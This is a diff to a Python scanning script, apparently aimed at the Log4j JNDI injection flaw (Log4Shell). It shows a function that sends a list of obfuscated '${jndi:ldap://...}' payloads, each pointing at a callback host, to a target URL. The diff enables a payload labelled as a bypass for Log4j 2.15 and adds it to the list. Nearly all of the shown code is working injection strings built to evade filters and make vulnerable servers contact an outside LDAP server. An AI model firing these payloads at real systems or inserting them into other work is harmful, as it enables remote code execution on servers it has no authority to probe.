@@ -142,11 +142,11 @@ def scan_url(url, callback_host):
     payload7 = "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://"+callback_host+"}"
     payload8 = "${\u006a\u006e\u0064\u0069:ldap://"+callback_host+"}"
     payload9 = "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//"+callback_host+"}"
-    #payload10 = "${jnd${upper:ı}:ldap://"+callback_host+"}" will debug in a future versionssssssss
+    payload10 = "${jndi:ldap://127.0.0.1#"+callback_host+"}" #2.15 bypass
     payload11 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}"
     payload12 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}"
     payload13 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}"
-    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload11, payload12, payload13]
+    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13]
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         try:
